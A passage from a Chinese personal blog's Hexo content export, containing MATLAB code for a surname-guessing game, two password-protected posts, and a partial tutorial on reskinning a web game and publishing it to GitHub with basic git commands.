class="token string">"詹"</span><span class="token punctuation">,</span><span class="token string">"束"</span><span class="token punctuation">,</span><span class="token string">"龙"</span><span class="token punctuation">,</span><span class="token string">"叶"</span><span class="token punctuation">,</span><span class="token string">"幸"</span><span class="token punctuation">,</span><span class="token string">"司"</span><span class="token punctuation">,</span><span class="token string">"韶"</span><span class="token punctuation">,</span><span class="token string">"郜"</span><span class="token punctuation">,</span><span class="token string">"黎"</span><span class="token punctuation">,</span><span class="token string">"蓟"</span><span class="token punctuation">,</span><span class="token string">"薄"</span><span class="token punctuation">,</span><span class="token string">"印"</span><span class="token punctuation">,</span><span class="token string">"宿"</span><span class="token punctuation">,</span><span class="token string">"白"</span><span class="token punctuation">,</span><span class="token string">"怀"</span><span class="token punctuation">,</span><span class="token string">"蒲"</span><span class="token punctuation">,</span><span class="token string">"邰"</span><span class="token punctuation">,</span><span class="token string">"从"</span><span class="token punctuation">,</span><span class="token string">"鄂"</span><span class="token punctuation">,</span><span class="token string">"索"</span><span class="token punctuation">,</span><span class="token string">"咸"</span><span class="token punctuation">,</span><span class="token string">"籍"</span><span class="token punctuation">,</span><span class="token string">"赖"</span><span class="token punctuation">,</span><span class="token string">"卓"</span><span class="token punctuation">,</span><span class="token string">"蔺"</span><span class="token punctuation">,</span><span class="token string">"屠"</span><span class="token punctuation">,</span><span class="token string">"蒙"</span><span class="token punctuation">,</span><span class="token string">"池"</span><span class="token punctuation">,</span><span class="token string">"乔"</span><span class="token punctuation">,</span><span class="token string">"阴"</span><span class="token punctuation">,</span><span class="token string">"欎"</span><span class="token punctuation">,</span><span class="token string">"胥"</span><span class="token punctuation">,</span><span class="token string">"能"</span><span class="token punctuation">,</span><span class="token string">"苍"</span><span class="token punctuation">,</span><span class="token string">"双"</span><span class="token punctuation">,</span><span class="token string">"闻"</span><span class="token punctuation">,</span><span class="token string">"莘"</span><span class="token punctuation">,</span><span class="token string">"党"</span><span class="token punctuation">,</span><span class="token string">"翟"</span><span class="token punctuation">,</span><span class="token string">"谭"</span><span class="token punctuation">,</span><span class="token string">"贡"</span><span class="token punctuation">,</span><span class="token string">"劳"</span><span class="token punctuation">,</span><span class="token string">"逄"</span><span class="token punctuation">,</span><span class="token string">"姬"</span><span class="token punctuation">,</span><span class="token string">"申"</span><span class="token punctuation">,</span><span class="token string">"扶"</span><span class="token punctuation">,</span><span class="token string">"堵"</span><span class="token punctuation">,</span><span class="token string">"冉"</span><span class="token punctuation">,</span><span class="token string">"宰"</span><span class="token punctuation">,</span><span class="token string">"郦"</span><span class="token punctuation">,</span><span class="token string">"雍"</span><span class="token punctuation">,</span><span class="token string">"舄"</span><span class="token punctuation">,</span><span class="token string">"璩"</span><span class="token punctuation">,</span><span class="token string">"桑"</span><span class="token punctuation">,</span><span class="token string">"桂"</span><span class="token punctuation">,</span><span class="token string">"濮"</span><span class="token punctuation">,</span><span class="token string">"牛"</span><span class="token punctuation">,</span><span class="token string">"寿"</span><span class="token punctuation">,</span><span class="token string">"通"</span><span class="token punctuation">,</span><span class="token string">"边"</span><span class="token punctuation">,</span><span class="token string">"扈"</span><span class="token punctuation">,</span><span class="token string">"燕"</span><span class="token punctuation">,</span><span class="token string">"冀"</span><span class="token punctuation">,</span><span class="token string">"郏"</span><span class="token punctuation">,</span><span class="token string">"浦"</span><span class="token punctuation">,</span><span class="token string">"尚"</span><span class="token punctuation">,</span><span class="token string">"农"</span><span class="token punctuation">,</span><span class="token string">"温"</span><span class="token punctuation">,</span><span class="token string">"别"</span><span class="token punctuation">,</span><span class="token string">"庄"</span><span class="token punctuation">,</span><span class="token string">"晏"</span><span class="token punctuation">,</span><span class="token string">"柴"</span><span class="token punctuation">,</span><span class="token string">"瞿"</span><span class="token punctuation">,</span><span class="token string">"阎"</span><span class="token punctuation">,</span><span class="token string">"充"</span><span class="token punctuation">,</span><span class="token string">"慕"</span><span class="token punctuation">,</span><span class="token string">"连"</span><span class="token punctuation">,</span><span class="token string">"茹"</span><span class="token punctuation">,</span><span class="token string">"习"</span><span class="token punctuation">,</span><span class="token string">"宦"</span><span class="token punctuation">,</span><span class="token string">"艾"</span><span class="token punctuation">,</span><span class="token string">"鱼"</span><span class="token punctuation">,</span><span class="token string">"容"</span><span class="token punctuation">,</span><span class="token string">"向"</span><span class="token punctuation">,</span><span class="token string">"古"</span><span class="token punctuation">,</span><span class="token string">"易"</span><span class="token punctuation">,</span><span class="token string">"慎"</span><span class="token punctuation">,</span><span class="token string">"戈"</span><span class="token punctuation">,</span><span class="token string">"廖"</span><span class="token punctuation">,</span><span class="token string">"庾"</span><span class="token punctuation">,</span><span class="token string">"终"</span><span class="token punctuation">,</span><span class="token string">"暨"</span><span class="token punctuation">,</span><span class="token string">"居"</span><span class="token punctuation">,</span><span class="token string">"衡"</span><span class="token punctuation">,</span><span class="token string">"步"</span><span class="token punctuation">,</span><span class="token string">"都"</span><span class="token punctuation">,</span><span class="token string">"耿"</span><span class="token punctuation">,</span><span class="token string">"满"</span><span class="token punctuation">,</span><span class="token string">"弘"</span><span class="token punctuation">,</span><span class="token string">"匡"</span><span class="token punctuation">,</span><span class="token string">"国"</span><span class="token punctuation">,</span><span class="token string">"文"</span><span class="token punctuation">,</span><span class="token string">"寇"</span><span class="token punctuation">,</span><span class="token string">"广"</span><span class="token punctuation">,</span><span class="token string">"禄"</span><span class="token punctuation">,</span><span class="token string">"阙"</span><span class="token punctuation">,</span><span class="token string">"东"</span><span class="token punctuation">,</span><span class="token string">"殴"</span><span class="token punctuation">,</span><span class="token string">"殳"</span><span class="token punctuation">,</span><span class="token string">"沃"</span><span class="token punctuation">,</span><span class="token string">"利"</span><span class="token punctuation">,</span><span class="token string">"蔚"</span><span class="token punctuation">,</span><span class="token string">"越"</span><span class="token punctuation">,</span><span class="token string">"夔"</span><span class="token punctuation">,</span><span class="token string">"隆"</span><span class="token punctuation">,</span><span class="token string">"师"</span><span class="token punctuation">,</span><span class="token string">"巩"</span><span class="token punctuation">,</span><span class="token string">"厍"</span><span class="token punctuation">,</span><span class="token string">"聂"</span><span class="token punctuation">,</span><span class="token string">"晁"</span><span class="token punctuation">,</span><span class="token string">"勾"</span><span class="token punctuation">,</span><span class="token string">"敖"</span><span class="token punctuation">,</span><span class="token string">"融"</span><span class="token punctuation">,</span><span class="token string">"冷"</span><span class="token punctuation">,</span><span class="token string">"訾"</span><span class="token punctuation">,</span><span class="token string">"辛"</span><span class="token punctuation">,</span><span class="token string">"阚"</span><span class="token punctuation">,</span><span class="token string">"那"</span><span class="token punctuation">,</span><span class="token string">"简"</span><span class="token punctuation">,</span><span class="token string">"饶"</span><span class="token punctuation">,</span><span class="token string">"空"</span><span class="token punctuation">,</span><span class="token string">"曾"</span><span class="token punctuation">,</span><span class="token string">"毋"</span><span class="token punctuation">,</span><span class="token string">"沙"</span><span class="token punctuation">,</span><span class="token string">"乜"</span><span class="token punctuation">,</span><span class="token string">"养"</span><span class="token punctuation">,</span><span class="token string">"鞠"</span><span class="token punctuation">,</span><span class="token string">"须"</span><span class="token punctuation">,</span><span class="token string">"丰"</span><span class="token punctuation">,</span><span class="token string">"巢"</span><span class="token punctuation">,</span><span class="token string">"关"</span><span class="token punctuation">,</span><span class="token string">"蒯"</span><span class="token punctuation">,</span><span class="token string">"相"</span><span class="token punctuation">,</span><span class="token string">"查"</span><span class="token punctuation">,</span><span class="token string">"後"</span><span class="token punctuation">,</span><span class="token string">"荆"</span><span class="token punctuation">,</span><span class="token string">"红"</span><span class="token punctuation">,</span><span class="token string">"游"</span><span class="token punctuation">,</span><span class="token string">"竺"</span><span class="token punctuation">,</span><span class="token string">"权"</span><span class="token punctuation">,</span><span class="token string">"逯"</span><span class="token punctuation">,</span><span class="token string">"盖"</span><span class="token punctuation">,</span><span class="token string">"益"</span><span class="token punctuation">,</span><span class="token string">"桓"</span><span class="token punctuation">,</span><span class="token string">"公"</span><span class="token punctuation">,</span><span class="token string">"万俟"</span><span class="token punctuation">,</span><span class="token string">"司马"</span><span class="token punctuation">,</span><span class="token string">"上官"</span><span class="token punctuation">,</span><span class="token string">"欧阳"</span><span class="token punctuation">,</span><span class="token string">"夏侯"</span><span class="token punctuation">,</span><span class="token string">"诸葛"</span><span class="token punctuation">,</span><span class="token string">"闻人"</span><span class="token punctuation">,</span><span class="token string">"东方"</span><span class="token punctuation">,</span><span class="token string">"赫连"</span><span class="token punctuation">,</span><span class="token string">"皇甫"</span><span class="token punctuation">,</span><span class="token string">"尉迟"</span><span class="token punctuation">,</span><span class="token string">"公羊"</span><span class="token punctuation">,</span><span class="token string">"澹台"</span><span class="token punctuation">,</span><span class="token string">"公冶"</span><span class="token punctuation">,</span><span class="token string">"宗政"</span><span class="token punctuation">,</span><span class="token string">"濮阳"</span><span class="token punctuation">,</span><span class="token string">"淳于"</span><span class="token punctuation">,</span><span class="token string">"单于"</span><span class="token punctuation">,</span><span class="token string">"太叔"</span><span class="token punctuation">,</span><span class="token string">"申屠"</span><span class="token punctuation">,</span><span class="token string">"公孙"</span><span class="token punctuation">,</span><span class="token string">"仲孙"</span><span class="token punctuation">,</span><span class="token string">"轩辕"</span><span class="token punctuation">,</span><span class="token string">"令狐"</span><span class="token punctuation">,</span><span class="token string">"钟离"</span><span class="token punctuation">,</span><span class="token string">"宇文"</span><span class="token punctuation">,</span><span class="token string">"长孙"</span><span class="token punctuation">,</span><span class="token string">"慕容"</span><span class="token punctuation">,</span><span class="token string">"鲜于"</span><span class="token punctuation">,</span><span class="token string">"闾丘"</span><span class="token punctuation">,</span><span class="token string">"司徒"</span><span class="token punctuation">,</span><span class="token string">"司空"</span><span class="token punctuation">,</span><span class="token string">"亓官"</span><span class="token punctuation">,</span><span class="token string">"司寇"</span><span class="token punctuation">,</span><span class="token string">"仉"</span><span class="token punctuation">,</span><span class="token string">"督"</span><span class="token punctuation">,</span><span class="token string">"子车"</span><span class="token punctuation">,</span><span class="token string">"颛孙"</span><span class="token punctuation">,</span><span class="token string">"端木"</span><span class="token punctuation">,</span><span class="token string">"巫马"</span><span class="token punctuation">,</span><span class="token string">"公西"</span><span class="token punctuation">,</span><span class="token string">"漆雕"</span><span class="token punctuation">,</span><span class="token string">"乐正"</span><span class="token punctuation">,</span><span class="token string">"壤驷"</span><span class="token punctuation">,</span><span class="token string">"公良"</span><span class="token punctuation">,</span><span class="token string">"拓跋"</span><span class="token punctuation">,</span><span class="token string">"夹谷"</span><span class="token punctuation">,</span><span class="token string">"宰父"</span><span class="token punctuation">,</span><span class="token string">"谷梁"</span><span class="token punctuation">,</span><span class="token string">"晋"</span><span class="token punctuation">,</span><span class="token string">"楚"</span><span class="token punctuation">,</span><span class="token string">"闫"</span><span class="token punctuation">,</span><span class="token string">"法"</span><span class="token punctuation">,</span><span class="token string">"汝"</span><span class="token punctuation">,</span><span class="token string">"鄢"</span><span class="token punctuation">,</span><span class="token string">"涂"</span><span class="token punctuation">,</span><span class="token string">"钦"</span><span class="token punctuation">,</span><span class="token string">"段干"</span><span class="token punctuation">,</span><span class="token string">"百里"</span><span class="token punctuation">,</span><span class="token string">"东郭"</span><span class="token punctuation">,</span><span class="token string">"南门"</span><span class="token punctuation">,</span><span class="token string">"呼延"</span><span class="token punctuation">,</span><span class="token string">"归"</span><span class="token punctuation">,</span><span class="token string">"海"</span><span class="token punctuation">,</span><span class="token string">"羊舌"</span><span class="token punctuation">,</span><span class="token string">"微生"</span><span class="token punctuation">,</span><span class="token string">"岳"</span><span class="token punctuation">,</span><span class="token string">"帅"</span><span class="token punctuation">,</span><span class="token string">"缑"</span><span class="token punctuation">,</span><span class="token string">"亢"</span><span class="token punctuation">,</span><span class="token string">"况"</span><span class="token punctuation">,</span><span class="token string">"后"</span><span class="token punctuation">,</span><span class="token string">"有"</span><span class="token punctuation">,</span><span class="token string">"琴"</span><span class="token punctuation">,</span><span class="token string">"梁丘"</span><span class="token punctuation">,</span><span class="token string">"左丘"</span><span class="token punctuation">,</span><span class="token string">"东门"</span><span class="token punctuation">,</span><span class="token string">"西门"</span><span class="token punctuation">,</span><span class="token string">"商"</span><span class="token punctuation">,</span><span class="token string">"牟"</span><span class="token punctuation">,</span><span class="token string">"佘"</span><span class="token punctuation">,</span><span class="token string">"佴"</span><span class="token punctuation">,</span><span class="token string">"伯"</span><span class="token punctuation">,</span><span class="token string">"赏"</span><span class="token punctuation">,</span><span class="token string">"南宫"</span><span class="token punctuation">,</span><span class="token string">"墨"</span><span class="token punctuation">,</span><span class="token string">"哈"</span><span class="token punctuation">,</span><span class="token string">"谯"</span><span class="token punctuation">,</span><span class="token string">"笪"</span><span class="token punctuation">,</span><span class="token string">"年"</span><span class="token punctuation">,</span><span class="token string">"爱"</span><span class="token punctuation">,</span><span class="token string">"阳"</span><span class="token punctuation">,</span><span class="token string">"佟"</span><span class="token punctuation">,</span><span class="token string">"第五"</span><span class="token punctuation">,</span><span class="token string">"言"</span><span class="token punctuation">,</span><span class="token string">"福"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
save Book_of_Family_Names<span class="token punctuation">.</span>mat  Book_of_Family_Names<span class="token punctuation">;</span>
<span class="token operator">%</span>信息量 log <span class="token number">500</span> <span class="token number">9</span>   <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>
Names_code<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"赵"</span><span class="token punctuation">,</span><span class="token string">"钱"</span><span class="token punctuation">,</span><span class="token string">"孙"</span><span class="token punctuation">,</span><span class="token string">"李"</span><span class="token punctuation">,</span><span class="token string">"周"</span><span class="token punctuation">,</span><span class="token string">"吴"</span><span class="token punctuation">,</span><span class="token string">"郑"</span><span class="token punctuation">,</span><span class="token string">"王"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
<span class="token function">Names_code_N2</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span>Names_code<span class="token punctuation">;</span>
end
<span class="token keyword">for</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
<span class="token function">Names_code_N3</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">=</span>Names_code_N2<span class="token punctuation">;</span>
end
<span class="token keyword">for</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
    <span class="token keyword">for</span> b<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
        <span class="token keyword">for</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">^</span><span class="token number">2</span><span class="token operator">+</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>c<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token function">length</span><span class="token punctuation">(</span>Book_of_Family_Names<span class="token punctuation">)</span>
                <span class="token function">Names_code_N</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">Book_of_Family_Names</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">^</span><span class="token number">2</span><span class="token operator">+</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                <span class="token function">Names_code_N</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token operator">=</span> <span class="token string">"猫"</span><span class="token punctuation">;</span>
            end
        end
    end
end

 <span class="token keyword">for</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
  <span class="token keyword">for</span> b<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
        <span class="token keyword">for</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
            <span class="token function">figure</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
                    <span class="token function">text</span><span class="token punctuation">(</span>a<span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">,</span>b<span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token function">Names_code_N</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
           hold on
        end
  end
 end
 
a1<span class="token operator">=</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'choice the your Chinese name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



 <span class="token keyword">for</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
  <span class="token keyword">for</span> b<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>                 
        <span class="token keyword">for</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
            <span class="token function">figure</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>b<span class="token punctuation">)</span>
                    <span class="token function">text</span><span class="token punctuation">(</span>a<span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">,</span>c<span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token function">Names_code_N</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            hold on
        end
  end
 end
 
b1<span class="token operator">=</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'choice the your Chinese name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token keyword">for</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
  <span class="token keyword">for</span> b<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>                 
        <span class="token keyword">for</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span>
            <span class="token function">figure</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>a<span class="token punctuation">)</span>
                    <span class="token function">text</span><span class="token punctuation">(</span>b<span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">,</span>c<span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token function">Names_code_N</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
            hold on
        end
  end
 end
 
c1<span class="token operator">=</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'choice the your Chinese name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token function">disp</span><span class="token punctuation">(</span><span class="token function">Names_code_N</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>b2<span class="token punctuation">,</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="4-图形用户界面设计"><a href="#4-图形用户界面设计" class="headerlink" title="4.图形用户界面设计"></a>4.图形用户界面设计</h2><ul>
<li><p>1.第一次选择<br><img src="https://img-blog.csdnimg.cn/20201023212813254.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>2.第二次选择<br><img src="https://img-blog.csdnimg.cn/20201023215340588.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>3.第三次选择</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20201023215522191.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ul>
<li><p>结果：<br><img src="https://img-blog.csdnimg.cn/20201023215814953.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>[x] 你的姓是万对吗？</p>
</li>
</ul>
<pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid">gantt
        dateFormat  2020-10-23
        title  不用告诉我就能知道你的姓
        section 已经完成
        已完成               :done,    des1, 2020-10-06,2020-10-16
        进行中               :active,  des2, 2020-10-023, 3d
        选择2               :         des3, after des2, 4d
        选择3               :         des4, after des3, 2d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="5-结论"><a href="#5-结论" class="headerlink" title="5.结论"></a>5.结论</h2><p>可以修改尝试进行4x4进行选择[4,4,4,4]</p>
<p> 源代码:<a href="https://zhidao.baidu.com/question/213833749.html">不问知其名-赚点小积分</a>.</p>
]]></content>
      <categories>
        <category>普通设计</category>
      </categories>
      <tags>
        <tag>信息论</tag>
        <tag>matlab</tag>
      </tags>
  </entry>
  <entry>
    <title>个人简历</title>
    <url>/2020/07/22/%E4%B8%AA%E4%BA%BA%E7%AE%80%E5%8E%86/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c24044a225abfa8c6f2bb0a0824ab56734291f3bdab25204939b1606ce7c9898"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 请输入密码查看更多.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>简历</category>
      </categories>
      <tags>
        <tag>万鲲鹏</tag>
        <tag>个人简历2019</tag>
        <tag>加密</tag>
      </tags>
  </entry>
  <entry>
    <title>保研经历</title>
    <url>/2019/09/28/%E4%BF%9D%E7%A0%94%E7%BB%8F%E5%8E%86/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="2feee347f81a4ae77037db5b7a086e0ff9cf6c318d3469f8756eed623233ac81"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 请输入密码查看更多.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>加密</tag>
        <tag>推免</tag>
      </tags>
  </entry>
  <entry>
    <title>合成厦大</title>
    <url>/2021/01/31/%E5%90%88%E6%88%90%E5%8E%A6%E5%A4%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="合成厦大"><a href="#合成厦大" class="headerlink" title="合成厦大"></a><center>合成厦大</center></h1><p>最近合成大西瓜蛮火的，就想把里面的图片改了，然后做一个自己的合成厦大。<br><span id="more"></span></p>
<h2 id="找合成大西瓜的源码"><a href="#找合成大西瓜的源码" class="headerlink" title="找合成大西瓜的源码"></a>找合成大西瓜的源码</h2><p>首先只是想做个python的发现没有python的源码，但是最后找到了一个网址，找到了源码<br><a href="https://github.com/liyupi/daxigua/releases/tag/1.0.0" title="合成大西瓜">合成大西瓜</a>大家也可以自行下载。</p>
<h2 id="然后看懂源码里面的东西"><a href="#然后看懂源码里面的东西" class="headerlink" title="然后看懂源码里面的东西"></a>然后看懂源码里面的东西</h2><p>其实仔细看看就是把里面的资源文件给改掉就可以达到目的，接下来编写excel记录需要修改的文件，然后依次修改修改里面的文件。<br>可以通过F12开发者模式找到每种水果对应什么图片。<br>这里我用excel将所有水果修改后的图片、像素和图片内容一一对应，有需要的可以自行修改内容：<br><a href="http://www.mmrsl.cn/wp-content/uploads/2021/01/wp_editor_md_d946f9006675e38d1a687a8510a70136.jpg"><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/wp_editor_md_d946f9006675e38d1a687a8510a70136.jpg" alt=""></a><br>可以参考上诉的图片进行修改。</p>
<h2 id="去广告"><a href="#去广告" class="headerlink" title="去广告"></a>去广告</h2><p>去广告其实如果会的话可以F12找到那个广告的网址，然后将广告网址替换成自己的网址。（不多赘述，可以自行尝试）</p>
<h2 id="上线发布"><a href="#上线发布" class="headerlink" title="上线发布"></a>上线发布</h2><p>本人采用的是github，如何上传可以参考我之前的文章—<a href="https://www.codekp.cn/2020/12/12/%E8%A1%A8%E7%99%BD%E7%BD%91%E7%AB%99%E3%80%81%E7%BD%97%E7%9B%98%E6%97%B6%E9%92%9F%E6%95%99%E7%A8%8B/" title="如何优雅的制作表白网站">如何优雅的制作表白网站</a>。</p>
<h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><p>GitHub 是一个面向开源及私有软件项目的托管平台，因为只支持 Git 作为唯一的版本库格式进行托管，故名 GitHub。</p>
<p>GitHub 于 2008 年 4 月 10 日正式上线，除了 Git 代码仓库托管及基本的 Web 管理界面以外，还提供了订阅、讨论组、文本渲染、在线文件编辑器、协作图谱（报表）、代码片段分享（Gist）等功能。目前，其注册用户已经超过 350 万，托管版本数量也是非常之多，其中不乏知名开源项目 Ruby on Rails、jQuery、python 等。</p>
<p>本文需要先下载git <a href="https://git-scm.com/downloads">下载地址</a></p>
<p>git教程请参考<a href="https://www.liaoxuefeng.com/wiki/896043488029600">廖雪峰Git</a></p>
<h3 id="首先我们来学习一下，一些git的push方法"><a href="#首先我们来学习一下，一些git的push方法" class="headerlink" title="首先我们来学习一下，一些git的push方法"></a>首先我们来学习一下，一些git的push方法</h3><pre class="line-numbers language-none"><code class="language-none">git init
git add .
git commit -m &quot;first commit&quot;
git branch -M main
git remote add origin https:&#x2F;&#x2F;github.com&#x2F;mmrslwan1110&#x2F;HCXMU.git
git push -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本过程可以参考我为大家寻找的教程<a href="https://www.cnblogs.com/lijiayi/p/githubpages.html">github创建账号、上传文件</a></p>
<h5 id="合成大西瓜源码下载"><a href="#合成大西瓜源码下载" class="headerlink" title="合成大西瓜源码下载"></a>合成大西瓜源码下载</h5><p>建议采用命令行形式下载会更快，当然可以直接downloadzip文件。</p>
<h5 id="上传源码到自己的web"><a href="#上传源码到自己的web" class="headerlink" title="上传源码到自己的web"></a>上传源码到自己的web</h5><ol>
<li>创建自己的仓库 参考1中教程</li>
<li>输入git init<pre class="line-numbers language-none"><code class="language-none">git init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
